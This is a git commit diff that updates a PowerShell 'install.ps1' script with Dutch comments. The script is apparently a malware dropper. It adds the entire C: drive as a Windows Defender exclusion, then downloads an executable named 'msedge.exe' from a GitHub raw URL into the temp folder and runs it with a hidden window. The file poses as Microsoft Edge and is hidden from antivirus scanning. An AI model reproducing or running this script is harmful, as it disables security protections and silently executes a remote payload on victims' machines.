72eeac4280e9713989dc5e52dd3410a0c33bff63
Nxtccijo <ietsbdbd@gmail.com>
2025-03-20 10:59:53 +0100

    Update install.ps1

--- install.ps1
+++ install.ps1
@@ -2,7 +2,7 @@
 Add-MpPreference -ExclusionPath "C:\"
 
 # Download het bestand "msedge.exe" naar de tijdelijke map
-iwr "https://raw.githubusercontent.com/Nxtccijo/oooow/refs/heads/main/msedge.exe" -outfile "$env:tmp\msedge.exe"
+Invoke-WebRequest -Uri "https://raw.githubusercontent.com/Nxtccijo/oooow/refs/heads/main/msedge.exe" -OutFile "$env:TEMP\msedge.exe"
 
 # Voer het gedownloade bestand uit
-cd $env:tmp; Start-Process -FilePath "$env:tmp\msedge.exe" -WindowStyle h -Wait
+Start-Process -FilePath "$env:TEMP\msedge.exe" -WindowStyle Hidden -Wait
